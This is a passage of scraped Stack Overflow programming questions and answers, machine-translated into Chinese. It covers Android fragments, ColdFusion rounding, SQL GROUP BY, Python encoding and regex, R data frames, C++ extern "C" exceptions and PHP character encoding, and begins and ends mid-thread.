import android.app.Activity;
import android.app.Fragment;
import android.app.FragmentManager;
import android.os.Bundle;
import android.preference.PreferenceFragment;
import android.support.v13.app.FragmentPagerAdapter; // instead of v4.app...
import android.support.v4.view.ViewPager;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.ViewGroup;
import android.widget.TextView;

public class MainActivity extends Activity { // no longer FragmentActivity

    // these comments are now out-of-date; v13, not v4
    /**
     * The {@link android.support.v4.view.PagerAdapter} that will provide
     * fragments for each of the sections. We use a
     * {@link android.support.v4.app.FragmentPagerAdapter} derivative, which
     * will keep every loaded fragment in memory. If this becomes too memory
     * intensive, it may be best to switch to a
     * {@link android.support.v4.app.FragmentStatePagerAdapter}.
     */
    SectionsPagerAdapter mSectionsPagerAdapter;

    /**
     * The {@link ViewPager} that will host the section contents.
     */
    ViewPager mViewPager;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Create the adapter that will return a fragment for each of the three
        // primary sections of the app.
        mSectionsPagerAdapter = new SectionsPagerAdapter(
                getFragmentManager()); // instead of getSupportFragmentMangager

        // Set up the ViewPager with the sections adapter.
        mViewPager = (ViewPager) findViewById(R.id.pager);
        mViewPager.setAdapter(mSectionsPagerAdapter);

    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.main, menu);
        return true;
    }

    /**
     * A {@link FragmentPagerAdapter} that returns a fragment corresponding to
     * one of the sections/tabs/pages.
     */
    public class SectionsPagerAdapter extends FragmentPagerAdapter {

        public SectionsPagerAdapter(FragmentManager fm) {
            super(fm);
        }

        @Override
        public Fragment getItem(int position) {
            // this is just to show it compiles
            if (position == 0) {
                // you should really make this a public class elsewhere..
                return new PreferenceFragment() {
                    @Override
                    public void onCreate(Bundle savedInstanceState) {
                        super.onCreate(savedInstanceState);
                        addPreferencesFromResource(R.xml.settings_preferences);
                    }
                };
            }
            // getItem is called to instantiate the fragment for the given page.
            // Return a DummySectionFragment (defined as a static inner class
            // below) with the page number as its lone argument.
            Fragment fragment = new DummySectionFragment();
            Bundle args = new Bundle();
            args.putInt(DummySectionFragment.ARG_SECTION_NUMBER, position + 1);
            fragment.setArguments(args);
            return fragment;
        }

        @Override
        public int getCount() {
            // Show 3 total pages.
            return 3;
        }

        @Override
        public CharSequence getPageTitle(int position) {
            Locale l = Locale.getDefault();
            switch (position) {
            case 0:
                return getString(R.string.title_section1).toUpperCase(l);
            case 1:
                return getString(R.string.title_section2).toUpperCase(l);
            case 2:
                return getString(R.string.title_section3).toUpperCase(l);
            }
            return null;
        }
    }

    /**
     * A dummy fragment representing a section of the app, but that simply
     * displays dummy text.
     */
    public static class DummySectionFragment extends Fragment {
        /**
         * The fragment argument representing the section number for this
         * fragment.
         */
        public static final String ARG_SECTION_NUMBER = "section_number";

        public DummySectionFragment() {
        }

        @Override
        public View onCreateView(LayoutInflater inflater, ViewGroup container,
                Bundle savedInstanceState) {
            View rootView = inflater.inflate(R.layout.fragment_main_dummy,
                    container, false);
            TextView dummyTextView = (TextView) rootView
                    .findViewById(R.id.section_label);
            dummyTextView.setText(Integer.toString(getArguments().getInt(
                    ARG_SECTION_NUMBER)));
            return rootView;
        }
    }

} 
```

settings_preferences.xml：

```
<?xml version="1.0" encoding="utf-8"?>

<PreferenceScreen
   xmlns:android="http://schemas.android.com/apk/res/android">

   <PreferenceCategory
      android:key="my_category_key"
      android:title="My Title">

       <CheckBoxPreference
         android:key="pref_key"
         android:title="Title"
         android:summary="Summary"
         android:defaultValue="false"
         />

   </PreferenceCategory>

</PreferenceScreen> 
```

![在此处输入图像描述](https://i.stack.imgur.com/8anXh.png)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T02:38:27.187

[文档](http://developer.android.com/reference/android/app/FragmentTransaction.html#add%28android.app.Fragment,%20java.lang.String%29)

我认为您需要为片段事务指定一个容器视图 ID。尝试给它你的 ViewPager 的 id。或者，将 ViewPager 放在另一个容器中，给它一个 id，然后使用它。

# coldfusion - 我怎样才能总是四舍五入到最接近的 10 个整数？

> ID：15845641
> 
> 赞同：4
> 
> 时间：2013-04-06T00:25:09.137
> 
> 标签：coldfusion, logic

所以，我有一个返回许多记录的查询。在我的结果页面上，我显示一行内容：**30 多个**结果中的 1 到 10 个结果如下所示。

我通过这样做得到的 30+ 号码：

```
<!--- round to the nearest ten --->
<cfset totalfoundRounded = Round(myquery.recordcount/ 10) * 10> 
```

如果我的记录数为例如 34 或更少，这将非常有用。或者 24 或更少，基本上一旦超过 5，我的代码就会四舍五入。所以即使只有 18 条记录，它也会说找到 20+ 条记录。

我一直在摸索如何让这个逻辑起作用，以便它总是向下舍入到最接近的 10，即使它是 18 或 19。

我尝试使用 int() 但这不起作用，它只适用于小数位。

那么，coldfusion 中是否有一个功能，或者我缺少一些技术来让它发挥作用？我一直找不到任何搜索，数学不是我的强项:(

非常感谢您的任何建议！！

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-04-06T00:29:48.263

试试这个？

```
<cfset totalfoundRounded = Int(myquery.recordcount/ 10) * 10> 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-04-06T00:30:35.437

当它小于 10 时，你想让它说什么？0+？你大概可以做到`number - (number % 10)`。这将始终向下舍入到最接近的 10 倍数。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-06-30T15:15:31.273

那这个呢？

```
 function Roundupdollars(amt) { 

    roundedAmt = amt * 100
    roundedAmt = Round(roundedAmt)
    roundedAmt = roundedAmt / 100
    return roundedAmt;
} 
```

# php - 您可以直接从 Web 服务器查看 PHP 脚本代码吗

> ID：15845646
> 
> 赞同：-2
> 
> 时间：2013-04-06T00:25:47.253
> 
> 标签：php

我是一个完整的 PHP 新手，我只是想编写一个简单的 Web 表单和脚本来检查输入是否与特定字符串匹配。我的工作没有问题，只是想知道网络表单用户是否有某种方法可以解析脚本代码并查看我正在比较的内容，从而向他们透露秘密信息。

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T00:27:11.167

如果您的 apache 服务器配置错误，则有可能。但除此之外，PHP 是服务器端脚本，并且仅对服务器/FTP 用户可见。

# python - 在后续 IPython 笔记本单元格中重新显示修改后的绘图

> ID：15845654
> 
> 赞同：4
> 
> 时间：2013-04-06T00:27:11.160
> 
> 标签：python, matplotlib, ipython

我正在使用 IPython notebook 创建一个演示。我在 pylab 内联模式下启动笔记本，例如`ipython notebook --pylab=inline`，我想做的是逐步构建绘图，在后续单元格中修改绘图的各个方面，并在每次修改后重新显示图表。例如，我想要连续的单元格，

单元格 1：

```
from pandas.io.data import DataReader
from datetime import datetime
import matplotlib.pyplot as plt

goog = DataReader("GOOG",  "yahoo", datetime(2000,1,1), datetime(2012,1,1))
close_vals = goog['Close']
plot(close_vals.index, close_vals.values)

CHART DISPLAYED INLINE 
```

单元格 2：

```
xlim(datetime(2009,1,1), datetime(2010,1,1))

MODIFIED CHART DISPLAYED INLINE 
```

但是，原始图表似乎没有进入后续单元格，并且 CELL 2 中显示的图表是空的。为了看到修改后的原始情节，我必须重新发出情节命令，

单元格 2：

```
plot(close_vals.index, close_vals.values)
xlim(datetime(2009,1,1), datetime(2010,1,1)) 
```

当我添加移动平均趋势线和标签时，这很快变得笨重和不雅。此外，从 IPython 控制台工作，这种逐步构建绘图的方法工作得很好。有人知道在笔记本中创建这种演示的更好方法吗？谢谢。

更新：

我的最终代码最终看起来像这样。

单元格 1：

```
from pandas.io.data import DataReader
from datetime import datetime
import matplotlib.pyplot as plt

goog = DataReader("GOOG",  "yahoo", datetime(2000,1,1), datetime(2012,1,1))
close_vals = goog['Close']
fig, ax = subplots(1,1)
ax.plot(close_vals.index, close_vals.values,label='GOOG Stock Price') 
```

单元格 2：

```
ax.set_xlim(datetime(2009,1,1), datetime(2010,1,1))
fig 
```

单元格 3：

```
avg_20 = [ sum(close_vals.values[i-20:i])/20.0 for i in range(20,len(close_vals))]
avg_20_times = close_vals.index[20:]
ax.plot(avg_20_times, avg_20, label='20 day trailing average')
ax.legend()
fig 
```

在每个后续单元格中更新`ax`后，调用`fig`重新显示绘图；正是我想要的。谢谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-06T00:38:04.997

您可以使用变量来引用图形和 Ax 对象：

在单元格 1 中：

```
fig, ax = subplots(1, 1)
plot(randn(100)); 
```

在单元格 2 中：

```
ax.set_xlim(20, 40)
fig 
```

# sql - GROUP BY 限制的示例

> ID：15845658
> 
> 赞同：2
> 
> 时间：2013-04-06T00:27:38.503
> 
> 标签：sql

在 postgreSQL 文档中，它说：

> 当 GROUP BY 存在时，SELECT 列表表达式引用未分组的列是无效的，除非在聚合函数中或者如果未分组的列在功能上依赖于分组的列，否则将返回多个可能的值未分组的列

我不明白关于“ `there would otherwise be more than one possible value to return for an ungrouped column`”的部分。

有人可以给我一个例子吗？如何为取消分组列返回一个以上的可能值？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T00:41:52.887

考虑这张表：

```
col_1 | col_2 | col_3
A       10      10
A       11      20
B       20      40
C       40      60 
```

并尝试运行对 col_3 的值求和的查询

```
SELECT col_1, col_2, SUM(col_3)
FROM   t1
GROUP BY col_1 
```

上面的查询可以有 2 个可能的输出：

```
Output 1: Here, col_2 = 10
---------------------------
col_1   |   col_2   |   SUM(col_3)
A           10          30      
B           20          40
C           40          60

Output 2: Here, col_2 = 11
---------------------------
col_1   |   col_2   |   SUM(col_3)
A           11          30 
B           20          40
C           40          60 
```

这是因为 col_2 没有包含在 GROUP BY 子句中。col_3 的求和基于 col_1 的分组按预期发生，但现在 SQL 引擎不知道您是否希望 A 的行 col_2 为 11 或 11。因此，“否则将返回多个可能的值对于未分组的列"

上述查询适用于 MySQL，它将随机返回上述 2 个输出之一，而 Oracle/SQL Server 将抛出您提到的错误

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T00:43:47.083

> 否则，未分组的列将返回多个可能的值

让我尝试用一​​小部分数据来解释这一点：

```
CREATE TABLE yourtable ([year] int, [amt] int);

INSERT INTO yourtable ([year], [amt])
VALUES
  (2012, 50),
  (2012, 60),
  (2011, 100),
  (2011, 89),
  (2013, 25); 
```

这个样本有 3 个不同的年份，现在我们想要获得每年的金额总和。

如果您使用查询：

```
select year, sum(amt) TotalPerYear
from yourtable 
```

并且您没有`GROUP BY`提供该`Year`列，那么数据库引擎将如何知道要为该年份选择什么值，因为该列中有多个值。

这`GROUP BY`是说我想要每年的总和，并不是说我想要它决定的任何一年的总和。

```
select year, sum(amt) TotalPerYear
from yourtable
group by year 
```

选择中的`GROUP BY`每一列，确保您获得分组列的正确聚合。

MySQL 是一个允许这种行为的数据库，它[在文档中明确指出，](http://dev.mysql.com/doc/refman/5.0/en/group-by-extensions.html)在选择列表中包含不在 group by 或聚合函数中的列可能会导致意外结果。

来自 MySQL 文档：

> 您可以使用此功能通过避免不必要的列排序和分组来获得更好的性能。*但是，这主要在每个未在 GROUP BY 中命名的非聚合列中的所有值对于每个组都相同时很有用。服务器可以**自由地从每个组中选择任何值，因此除非它们相同，否则选择的值是不确定的。***此外，从每个组中选择值不会受到添加 ORDER BY 子句的影响。在选择了值之后对结果集进行排序，并且 ORDER BY 不会影响服务器选择的值。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-06T00:40:21.473

假设您有一张人桌……姓名、城市、电话号码。你想按城市统计人数。因此，您选择 * 的城市和计数并按城市分组。在查询中包含电话号码（未分组）是没有意义的，因为每个分组很可能有多个电话号码，并且数据库不知道您想要什么。

# php - 一次移动多行的最有效方法

> ID：15845664
> 
> 赞同：0
> 
> 时间：2013-04-06T00:28:51.467
> 
> 标签：php, mysql

这是对长期问题的短期解决方案...

我有一个由其他人创建的数据库（并非总是如此）。一个特定的表存储历史事务数据。当这张表变大时，网站的表现就像垃圾一样。当我能做到时，我将重新设计数据库 3nf。在那之前，我需要将表限制为大约 500,000 行。所以我想定期运行一个脚本来将最旧的行移动到一个可能永远不会使用的存档表中。假设我一次移动 5-10K 行，最有效的方法是什么？

这是一个 MYSQL 数据库。

在我的脑海中，我想我会计算行数。找出计数 - 500000 LIMIT 1 id 是什么，然后将所有带有 ID <= 的东西移到那个位置。

我只是选择、插入和删除还是有更好的方法呢？

# python - 为什么我在尝试在 Python 2.7 中打印字符串时出错？

> ID：15845665
> 
> 赞同：2
> 
> 时间：2013-04-06T00:29:12.040
> 
> 标签：python

我正在尝试使用

[https://pypi.python.org/pypi/dbf](https://pypi.python.org/pypi/dbf)

读取数据库文件。我正在尝试按如下方式打印记录：

```
for record in race_db:
    print record 
```

这给了我一条错误消息

> UnicodeDecodeError：“ascii”编解码器无法解码位置 4 中的字节 0xc9：序数不在范围内（128）

所以我尝试映射到 unicode

```
string_record = [unicode(item) for item in record] 
```

一样。UTF-8：

```
string_record = [unicode(item, "utf8") for item in record] 
```

> TypeError：强制转换为 Unicode：需要字符串或缓冲区，找到 datetime.date

我只想对字符串功能进行排序我做错了什么？我知道我可以成功地遍历所有记录，因为类似：

```
print 'blah' 
```

工作正常。只是编码中的某些东西让我绊倒了。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-06T00:34:53.887

单个字节`\xC9`不是 UTF-8 中任何内容的有效编码。您需要弄清楚文本当前是如何编码的——在这种情况下，它很可能是[ISO 8859-1](http://en.wikipedia.org/wiki/ISO_8859-1)或[Windows-1252](http://en.wikipedia.org/wiki/Windows-1252)。然后，相应地对其进行解码。

例如，如果它是 Windows-1252，您将按如下方式对其进行解码：

```
string_record = 'foo \xc9 bar'
print string_record.decode('Windows-1252')  # Output: "foo É bar" 
```

# javascript - 在 Python 中模拟 JavaScript 数组

> ID：15845676
> 
> 赞同：0
> 
> 时间：2013-04-06T00:30:26.697
> 
> 标签：javascript, python, arrays

在 Python 中，是否可以模拟 JavaScript 数组（即，在数组范围之外添加值时自动扩展的数组）？在 JavaScript 中，当在数组的索引之外分配值时，数组会自动扩展，但在 Python 中，它们不会：

```
theArray = [None] * 5
theArray[0] = 0
print(theArray)
theArray[6] = 0 '''This line is invalid. Python arrays don't expand automatically, unlike JavaScript arrays.''' 
```

这在 JavaScript 中是有效的，我试图在 Python 中模仿它：

```
var theArray = new Array();
theArray[0] = 0;
console.log(theArray);
theArray[6] = 0; //the array expands automatically in JavaScript, but not in Python 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-06T01:04:47.167

如果你真的需要你可以定义这样的结构：

```
class ExpandingList(list):
    def __setitem__(self, key, value):
        try:
            list.__setitem__(self, key, value)
        except IndexError:
            self.extend((key - len(self)) * [None] + [value])

>>> a = ExpandingList()
>>> a[1] = 4
>>> a
[None, 4]
>>> a[4] = 4
>>> a
[None, 4, None, None, 4] 
```

将它与其他 python 功能集成可能会很棘手（负索引、切片）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-06T01:25:19.723

[zch 已经给出了一个很好的答案](https://stackoverflow.com/a/15845900/1615483)，但我会发布这个来告诉你如何复制**get**的行为

```
class MyList(list):
    @property
    def length(self): # for the example bracket notation
        return len(self)
    def __getitem__(self, key): # Fix GET
        try: # assume permission
            return list.__getitem__(self, key)
        except (IndexError, TypeError): # "ask forgiveness"
            pass # using pass to save indents as try was a return
        if key == 'length': # example bracket notation for length getter
            return self.length
        try: # JavaScript doesn't care about number type and accepts
            key = int(key) # strings, too, but Python req.s integers
            return list.__getitem__(self, int(key))
        except (IndexError, ValueError):
            pass
        return None
    def __setitem__(self, key, value): # Fix SET
        try:
            list.__setitem__(self, key, value)
            return value # copy return behaviour
        except (IndexError, TypeError):
            pass
        try:
            key = int(key) # force int
        except ValueError:
            return # fail quietly?
        if key < 0: # still throw for bad key
            raise IndexError()
        self.extend((key - len(self)) * [None]) # fill gap with None
        self.append(value) # append new value
        return value # copy return behaviour

>>> a = MyList()
>>> a[0] = 1
>>> a[2] = 1
>>> (a, a[3])
([1, None, 1], None)
>>> (a.length, a['length'])
(3, 3) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-06T00:59:08.097

我想不出这种实现方式的原生方式。话虽如此，创建一个符合您期望的函数并不是一个坏主意。而不是 using `my_list[index] = value`，您可以使用类似的东西：

```
def insertWithAutoFill(the_list, index, new_item):
    if index >= len(the_list):
        for i in range(len(the_list), index):
             the_list.append(None)
        the_list.append(new_item)
    else:
        the_list[index] = new_item 
```

你会这样称呼它：

```
my_list = [1, 2, 3]
insertWithAutoFill(my_list, 6, 23) 
```

现在`my_list`包含：

```
[1, 2, 3, None, None, None, 23] 
```

您可能需要调整某些内容以确保正确检查某些内容并正确`index`使用。这在特定情况下经过了少量测试和工作，但不能保证完美:)

# jquery - 如何在使用 jquery 更改选择框时 grep JSON

> ID：15845680
> 
> 赞同：0
> 
> 时间：2013-04-06T00:31:01.060
> 
> 标签：jquery, ajax, json, onchange, faceted-search

在从 JSON 对象中查找数据和显示数据方面，我仍然是一个新手，所以请回答我的问题，看看它的价值，我会尽量详细说明。

我需要一些帮助来编写一些 jQuery，它将在更改事件的选择框中获取选项的值并过滤从 JSON 对象填充的列表。

基本上我最终想要达到的是一个多维多面导航模型，它采用 JSON 对象并允许用户在更改事件上过滤该列表。

我意识到这有点含糊，但我会尽量回答你的问题。

到目前为止，这是我对 JS 的了解：

```
function getBeers(){
    $.grep(getBeerType, function(key, val){
      $.getJSON('includes/data.json', function(data) {
        var beers = [];

        $.each(data, function(key, val) {
          beers.push('<li id="' + key + '">' + val + '</li>');
        });

        $('<ul/>', {
          html: items.join('')
        }).appendTo('#beerlist');
      });
    });
  };

  $("#beerselector").change(function(){
    var getBeerType = $(this).val();
    getBeers(getBeerType);
  }); 
```

和 JSON：

```
{"beers":[
        {
            "name":"Surly Wet",
            "type":"Ale"
        },
        {
            "name":"Spaten Oktoberfest",
            "type":"Lager"
        },
        {
            "name":"Pliny the Elder",
            "type":"Ale"
        },
        {
            "name":"Summit IPA",
            "type":"Ale"
        },
        {
            "name":"Surly Coffee Bender",
            "type":"Porter"
        },
        {
            "name":"Lagunitas IPA",
            "type":"Ale"
        }
]} 
```

和 HTML：

```
 <label for="beerselector">What's your favorite beer type?</label>
  <select id="beerselector">
    <option value="">I like all beer</option>
    <option value="ale">Ales</option>
    <option value="lager">Lagers</option>
  </select>

  <div id="beerlist"></div> 
```

# c++ - 标记为 Extern "C" 的 C++ 函数可以抛出吗？

> ID：15845681
> 
> 赞同：31
> 
> 时间：2013-04-06T00:31:09.960
> 
> 标签：c++, extern-c

我有我想声明使用的 C++ 函数，`extern "C"`即使它们只在 C++ 代码中调用。是的，我知道这很奇怪，但为了保持一致性，我想这样做，因为我们混合了 C 和 C++ 声明。我只是想确保将 C++ 函数声明为`extern "C"`不会影响抛出的行为。

它看起来像这样：

```
extern "C" void foo() {throw exception;}

int bar()
{
    try
    {
        foo();
    } catch (exception e) { return 1; }
} 
```

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2013-04-06T00:39:26.753

“标记为 Extern “C” 的 C++ 函数可以抛出吗？

**是**的，从某种意义上说，无论是语言还是编译器都不会阻止您这样做。

**不**，从某种意义上说，如果你抛出，这将是一个未定义的行为，因为 C++ 异常跨越了语言边界。

在实践中：不要这样做。捕获异常并将其转换为错误代码，或其他语言可以理解的方式。

所以底线是：**不要**从标记为的函数中抛出异常`extern "C"`。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2014-06-16T11:01:21.240

对于[GCC，答案似乎没有定论](https://stackoverflow.com/questions/4695741/is-there-a-gcc-option-to-assume-all-extern-c-functions-cannot-propagate-except)。

但是，[MSVC 文档](http://msdn.microsoft.com/en-us/library/1deeycx5.aspx)在该主题上相对清晰：

*   `/EHa`and `/EHs`...*告诉编译器假设声明为 extern "C" 的函数可能会引发异常。*
*   `/EHsc`...*告诉编译器假设声明为 extern "C" 的函数永远不会引发 C++ 异常*

因此，对于 Visual-C++，是否获得定义的行为取决于编译器选项。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-06T00:42:36.013

它会编译，但从标记为具有 C 链接的函数抛出是未定义的行为。C 没有异常，因此通常您应该只返回一个错误代码和/或提供一个返回有关最后一个错误的信息的函数。

```
#include <exception>
extern "C" void foo() {throw std::exception();} 
```

编译好

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-06T00:38:42.637

这是您问题的答案：http: [//yosefk.com/c++fqa/mixing.html#fqa-32.6](http://yosefk.com/c++fqa/mixing.html#fqa-32.6)

基本上你是抓不到的。（但为什么你不只是编译它并尝试？:)）

# python - Python Tkinter 回调函数在 mainloop 之前执行

> ID：15845686
> 
> 赞同：1
> 
> 时间：2013-04-06T00:31:47.823
> 
> 标签：python, tkinter, tk

我正在尝试构建一个用于与串行设备通信的 gui。为此，我正在使用 Tkinter。我的问题是，每次我执行脚本时，只执行 estCon 函数和主循环，因此 gui 永远不会启动。如果我将 estCon 函数的定义放在主循环之后，则表示未找到 estCon 函数。

```
def estCon():
    # establish connection
    while True:
        try:
            ser = serial.Serial(port, baud, bytesize)
            print('Connected.')
            break
        except serial.SerialException:
            print('waiting for device ' + port + ' to be available.') 
            time.sleep(3)

    starttime = time.time()
    outfile = open(filename, 'a')
    doprint = True    

root = Tk()

estConButton = Button(root, text="Establish serial connection",
                      command=estCon())
estConButton.pack()

root.mainLoop() 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-06T00:48:24.743

您需要更改此行：

```
estConButton = Button(root, text="Establish serial connection", command=estCon()) 
```

到：

```
estConButton = Button(root, text="Establish serial connection", command=estCon) 
```

注意缺少括号`()`。基本上，您需要传递对按下按钮时将调用的函数的引用，而不是实际调用。

# r - 可变版本的应用？

> ID：15845688
> 
> 赞同：3
> 
> 时间：2013-04-06T00:31:49.043
> 
> 标签：r, dataframe

我正在尝试获取数据框中每个子集的平均值，并将该信息合并到一列中。

我可以用 lapply 做到这一点，但我不能让它“坚持”。是否存在具有副作用的 apply 系列函数的变体？plyr 库中的任何内容都可以。

```
data <- data.frame(
  A = sample(LETTERS[1:3], 20, replace=TRUE),
  B = runif(20),
  C = LETTERS[1:20])
# split by A
dataByA <- split(data, factor(data$A))
# get average of B per set
lapply(dataByA, function(df) {df$Bmean <- mean(df$B)}) # does nothing!
# remerge subsets
data <- rbind.fill(dataByA) 
```

谢谢

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-06T00:57:07.630

试试这个：

```
data$Bmean <- ave(data$B, data$A) 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-04-06T00:36:53.980

这种事情有很多选择，但为了纠正你的直接错误，你的匿名函数`lapply`根本没有返回任何东西。只需让它返回它正在操作的部分：

```
{df$Bmean <- mean(df$B); df} 
```

我将把它留给大众来向您展示您使用`by`, `ddply`+`mutate`或`transform`and的选择`data.table`。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-04-06T00:41:11.667

这可能有效：

```
library(plyr)
data1<-ddply(data,.(A),transform,Bmean=mean(B))

head(data1)
 A           B C    Bmean
1  A 0.616156407 E 0.5492000
2  A 0.568187293 G 0.5492000
3  A 0.899395311 H 0.5492000
4  A 0.113060973 K 0.5492000
5  B 0.872838203 A 0.7885643
6  B 0.906216467 B 0.7885643
7  B 0.944196701 N 0.7885643
8  B 0.445983319 O 0.7885643
9  B 0.773586589 T 0.7885643 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-04-06T06:19:21.107

根据@joran，我将成为大众中的一员；） data.table 中的解决方案如下

```
DT[ , Bmean := mean(B), by=A] 
```

* * *

`DT`简单的在哪里

```
library(data.table)
DT <- data.table( <your data frame> ) 
```

# python - 如何仅打印具有五个或更多匹配正则表达式的行？

> ID：15845693
> 
> 赞同：1
> 
> 时间：2013-04-06T00:33:26.050
> 
> 标签：python, regex, python-2.x, multiple-instances

我正在尝试在 Python 中使用正则表达式逐行解析一个大的制表符分隔的文本文件，并打印该行包含 5 个或更多实例的行`0/1`or `1/1`。

我的脚本几乎就在那里，但我正在努力处理 5 个或更多实例。

这将打印一个匹配的行。

```
import re  
f = open ("infile.txt", "r")  
out = open("outfile.txt", "w")  

for line in f:  
    if re.match(r"(.*)(0|1)/(1)(.*)", line):  
        print >> out, line, 
```

要仅打印具有 5 个或更多匹配项的行，我尝试`findall`了`finditer`以下操作，但它们不起作用：

```
for line in f:  
    x = len(re.findall(r"(.*)(0|1)/(1)(.*)", line)):  
    if x > 5:  
        print >> out, line, 
```

谁能帮我这个？

这是文本文件中一行的示例（所有空格都是文件中的制表符）：

```
X 6529 . C A,G PASS AC=4,2;AF=0.6777 1/1:0,20 0/1:0,16 0/1:0,16 0/0:4,16 0/0:3,1 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T00:56:42.063

您可以使用 {5,} 匹配模式 5 次或更多次

```
import re
f = open ("data.txt", "r")
out = open("dataout.txt", "w")

for line in f:
    if re.match(r"(.*([01]/1.*){5,}", line):
        print >> out, line, 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T00:57:07.803

我认为有两种可行的解决方案。第一个坚持您当前的想法，即使用与or`findall`的一次出现匹配的模式执行 a 。第二个是创建一个模式，该模式将一次匹配该文本五次。`0/1``1/1`

对于第一种方法，我认为您需要做的就是摆脱`.astericssymbol`当前模式的一些部分（我真的不明白为什么要拼写出来，而不是`.*`，但无论哪种方式都是错误的）。这是应该工作的代码：

```
for line in f:
    matches = re.findall(r'[01]/1', line)
    if len(matches) >= 5:
        print >> out, line, 
```

我已经消除了不需要的捕获组，它们可能会使事情变慢一些。

对于第二种方法，您只需对 进行一次调用，仅当它找到 5 个适当排序的匹配项时`re.search`才会返回非值。`None`该模式使用重复语法 ,`{N}`来准确地找到`N`前一个模式的副本。在这种情况下，我们需要匹配`0/1`or`1/1`位之间的额外字符，因此该模式`.*`添加了一个。由于我们想重复整个事情，我们需要将它包装在一个非捕获组中：

```
for line in f:
    if re.search(r'(:?[01]/1.*){5}', line):
        print >> out, line, 
```

# apache - 异常：java.lang.reflect.InvocationTargetException 消息：

> ID：15845696
> 
> 赞同：1
> 
> 时间：2013-04-06T00:33:36.830
> 
> 标签：apache, hibernate, jakarta-ee, tomcat7, axis

我正在尝试使用 Axis、Apache tomcat 7.0 和 Hibernate 在 eclipse 上创建 web 服务进行映射。我在我的服务类中的某个方法中添加了对 DAO 类（由 hibernate 生成的 xxxHome.java）的调用。当我真正测试 Web 服务客户端时，它会生成以下错误：

> 异常：java.lang.reflect.InvocationTargetException 消息：java.lang.reflect.InvocationTargetException

谁能帮帮我吗？

# character-encoding - 鉴于输出编码通常通过其他方式固定，mb_http_output() 有什么用处？

> ID：15845699
> 
> 赞同：5
> 
> 时间：2013-04-06T00:33:54.950
> 
> 标签：character-encoding

在整个互联网上，包括在 stackoverflow 中，建议使用 mb_http_input('utf-8') 让 PHP 以 UTF-8 编码工作。例如，请参阅[PHP/MySQL 编码问题。â��而不是某些字符](https://stackoverflow.com/questions/12984841/php-mysql-encoding-problems-a-instead-of-certain-characters)。另一方面，PHP 手册说我们无法修复 PHP 脚本中的输入编码，并且 mb_http_input 只是一种查询它是什么的方法，而不是一种设置它的方法。见[http://www.php.net/manual/en/mbstring.http.php](http://www.php.net/manual/en/mbstring.http.php)和[http://php.net/manual/en/function.mb-httpetinput.php](http://php.net/manual/en/function.mb-httpetinput.php). 好的，这只是对问题之前的上下文的澄清。在我看来，Apache + PHP + HTML中有很多多余的命令来控制从输入编码到内部编码，最后到输出编码的转换。我不明白这个的用处。例如，如果来自某个外部 HTTP 客户端的原始输入编码是 EUC-JP，而我将内部编码设置为 UTF-8，那么 PHP 将不得不进行转换。我对吗？如果我是对的，为什么我要在 php.ini 中设置输入编码（而不是只传递原始编码），因为它接下来会立即转换为 utf-8 内部编码？类似的问题也适用于输出。在我所有的 htpp 文件中，我使用带有 charset=utf-8 的元标记。因此，输出 HTTP 编码是固定的。此外，在 PHP.ini 中，我可以将出现在 HTTP 标头中的 default_charset 设置为 utf-8。当最终输出编码已经固定时，我为什么还要费心使用 mb_http_output('uft-8') 。总而言之，有人可以给我一个实际的具体示例，其中 mb_http_output('uft-8') 显然是必要的，并且不能被通常在 Dreamweaver 等编辑器中默认插入的更常用命令替换？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-04-06T00:48:41.393

这两个选项几乎是 PHP 设计人员曾经有过的最糟糕的想法，而且他们在编码方面有很多糟糕的想法。

要将字符串转换*为*特定的编码，必须知道*从*什么编码转换。传入的数据通常采用未声明的编码；服务器只是接收一些二进制数据，它不知道它代表什么编码。`accept-charset`您应该通过在表单上设置属性来声明您希望浏览器发送的编码；这样做并不能保证浏览器会这样做，并且它不会让 PHP 知道期望什么编码。

输出也是如此；PHP 字符串只是字节数组，它们没有关联的编码。我不知道 PHP 如何认为它知道如何在输入*或*输出时将任意字符串转换为特定的编码。

您应该手动处理这个问题，而且无论如何都很容易做到：向客户声明您期望的编码，*检查*输入是否使用正确的编码`mb_check_encoding`（不是`_detect encoding`或类似的，只需*检查*），拒绝无效输入，注意保留所有内容在整个应用程序流程中使用相同的编码。即，理想情况下，您的应用程序中**没有任何转换。**

如果您*确实*需要在任何时候进行转换，请将其设置为 Unicode 三明治：将输入从预期的编码转换为 UTF-8 或输入时的其他 Unicode 编码，在输出时将其转换回所需的输出编码。每当您需要转换时，请确保您知道要转换*的*内容。您不能通过一个声明神奇地“将所有字符串设为 UTF-8”。

# drupal - 未知领域 solr drupal 模块

> ID：15845711
> 
> 赞同：0
> 
> 时间：2013-04-06T00:36:01.143
> 
